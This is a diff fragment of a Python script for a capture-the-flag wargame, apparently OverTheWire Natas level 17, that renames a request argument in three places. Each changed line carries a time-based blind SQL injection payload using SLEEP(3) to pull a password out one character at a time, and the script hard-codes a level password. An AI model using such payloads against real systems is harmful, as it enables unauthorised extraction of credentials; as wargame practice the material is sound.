@@ -15,7 +15,7 @@ for i in range(1,70):
             17,
             "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
             endpoint="index.php?debug=yes",
-            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65+n)}%" AND SLEEP(3) #'}
+            param={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65 + n)}%" AND SLEEP(3) #'}
         )
         end = time()
         if end - start > 2.5:
@@ -28,7 +28,7 @@ for i in range(1,70):
             17,
             "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
             endpoint="index.php?debug=yes",
-            data={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(3) #'}
+            param={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(3) #'}
         )
         end = time()
         if end - start > 2.5:
@@ -42,7 +42,7 @@ for i in range(1,70):
                 17,
                 "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(3) #'}
+                param={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(3) #'}
             )
             end = time()
             if end - start > 2.5:
